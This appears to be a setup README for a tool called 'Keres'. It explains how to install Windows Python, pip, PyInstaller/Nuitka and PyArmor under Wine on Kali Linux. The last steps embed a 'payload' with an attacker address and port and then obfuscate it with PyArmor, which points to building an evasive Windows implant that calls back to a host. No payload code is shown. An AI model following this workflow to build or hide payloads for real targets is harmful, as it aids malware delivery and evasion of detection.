this is wine tutorial for compiling PEfor windows in linux

steps(assuming you are in ./Keres):

1- sudo apt install wine
-----------------------------------------------------------------------
(if you already have it : sudo apt-get install --reinstall wine)

2- wget https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe -O python-installer.exe
--------------------------------------------------------------------------------------

install python in wine by running : wine python-installer.exe
--------------------------------------------------------------------------

3- find ~/.wine -name python.exe
------------------------------------------------------
copy the path ,should look like this : 

/home/kali/.wine/drive_c/users/kali/AppData/Local/Programs/Python/Python311/python.exe
-------------------

make it into an alias :

alias winepython='wine /home/kali/.wine/drive_c/users/kali/AppData/Local/Programs/Python/Python311/python.exe'
-------------------------------


same thing with pip :

find ~/.wine -name pip.exe
--------------------------------------------------
/home/kali/.wine/drive_c/users/kali/AppData/Local/Programs/Python/Python311/Scripts/pip.exe
-----------------------------------------------------------------
alias winepip='wine /home/kali/.wine/drive_c/users/kali/AppData/Local/Programs/Python/Python311/Scripts/pip.exe'
--------------------------------------------
5- run like this : 

winepip install -r requirements.txt
------------------------------------------------------------------------

or just install nuitka or pyinstaller : 

winepip install nuitka
-------------------------------------------------------------------------------------------
or

winepip install pyinstaller
-------------------------------------------------------------------

6-you can now compile an exe file for windows in linux:

if you used :

winepip install -r requirements.txt
---------------------------------------------------

then :

find ~/.wine -name pyarmor.exe 

/home/kali/.wine/drive_c/users/kali/AppData/Local/Programs/Python/Python311/Scripts/pyarmor.exe

alias winepyarmor='wine /home/kali/.wine/drive_c/users/kali/AppData/Local/Programs/Python/Python311/Scripts/pyarmor.exe'

RUN ONCE to embed payload

winepython keres.py -a 'adresse' -P 'port'

then to obfuscate

winepyarmor cfg restrict_module=0

winepyarmor g pewpew.py


RUN a SECOND TIME:

winepython keres.py -a 'adresse' -P 'port'
------------------------------------------------------------------------------

should be working :)





